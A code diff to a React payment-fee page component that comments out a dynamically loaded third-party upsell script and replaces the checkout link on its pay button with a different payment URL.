@@ -22,17 +22,17 @@ export function PagamentoTarifa() {
 
     const [, setIsVisible] = useState(false);
 
-    useEffect(() => {
-        // Adicionar o script do upsell dinamicamente
-        const script = document.createElement("script");
-        script.src = "https://www.iexperience-app.com/oneclick.js";
-        script.async = true;
-        document.body.appendChild(script);
+    // useEffect(() => {
+    //     // Adicionar o script do upsell dinamicamente
+    //     const script = document.createElement("script");
+    //     script.src = "https://www.iexperience-app.com/oneclick.js";
+    //     script.async = true;
+    //     document.body.appendChild(script);
 
-        return () => {
-            document.body.removeChild(script);
-        };
-    }, []);
+    //     return () => {
+    //         document.body.removeChild(script);
+    //     };
+    // }, []);
 
     useEffect(() => {
         const SECONDS_TO_DISPLAY = 44;
@@ -181,7 +181,7 @@ export function PagamentoTarifa() {
                 </div> */}
 
                 <a
-                    href="https://pay.iexperience-app.com/f31d1b15"
+                    href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y"
                     className="w-full iexperience-upsell"
                 >
                     <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3 text-2xl">
